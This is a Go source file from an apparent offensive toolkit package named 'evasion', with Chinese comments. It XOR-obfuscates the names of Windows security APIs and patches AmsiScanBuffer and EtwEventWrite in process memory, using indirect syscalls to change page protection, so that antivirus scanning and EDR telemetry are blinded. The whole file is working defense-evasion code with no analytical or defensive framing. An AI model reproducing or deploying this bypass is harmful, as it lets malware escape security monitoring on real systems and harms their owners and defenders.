//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

var (
	encAmsiDll = []byte{0x2C, 0x12, 0x0C, 0x2E, 0x51, 0x1B, 0x13, 0x13}                                     // amsi.dll
	encAmsiSB  = []byte{0x3C, 0x12, 0x0C, 0x2E, 0x38, 0x38, 0x2C, 0x33, 0x3D, 0x0A, 0x30, 0x30, 0x1A, 0x0D} // AmsiScanBuffer
	encNTDll   = []byte{0x11, 0x0B, 0x1B, 0x13, 0x13, 0x51, 0x1B, 0x13, 0x13}                               // ntdll.dll
	encEtwEW   = []byte{0x3A, 0x0B, 0x28, 0x3A, 0x0A, 0x1A, 0x11, 0x0B, 0x28, 0x32, 0x0D, 0x2E, 0x0B, 0x1A} // EtwEventWrite

	// AMSI bypass: xor eax,eax; ret → 永远返回 AMSI_RESULT_CLEAN
	amsiPatchBytes = []byte{0x31, 0xC0, 0xC3}

	// ETW bypass: ret → EtwEventWrite直接返回 (Blind EDR)
	etwPatchBytes = []byte{0xC3}
)

// BypassAMSI 绕过AMSI — Patch AmsiScanBuffer返回0
func BypassAMSI() {
	lib := syscall.NewLazyDLL(xorDec(encAmsiDll, xk))
	proc := lib.NewProc(xorDec(encAmsiSB, xk))
	addr := proc.Addr()
	if addr == 0 {
		return
	}
	patchMem(addr, amsiPatchBytes)
}

// BypassETW 绕过ETW — Patch EtwEventWrite为ret
func BypassETW() {
	lib := syscall.NewLazyDLL(xorDec(encNTDll, xk))
	proc := lib.NewProc(xorDec(encEtwEW, xk))
	addr := proc.Addr()
	if addr == 0 {
		return
	}
	patchMem(addr, etwPatchBytes)
}

// patchMem 修改指定内存保护后写入patch
func patchMem(addr uintptr, patch []byte) {
	baseAddr := addr
	regionSize := uintptr(len(patch))
	var oldProtect uint32

	// 使用间接系统调用绕过用户态Hook
	CallNtPVM(
		uintptr(0xFFFFFFFFFFFFFFFF), // 当前进程
		&baseAddr,
		&regionSize,
		0x40, // PAGE_EXECUTE_READWRITE
		&oldProtect,
	)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)

	// 恢复原始保护
	CallNtPVM(
		uintptr(0xFFFFFFFFFFFFFFFF),
		&baseAddr,
		&regionSize,
		uintptr(oldProtect),
		&oldProtect,
	)
}
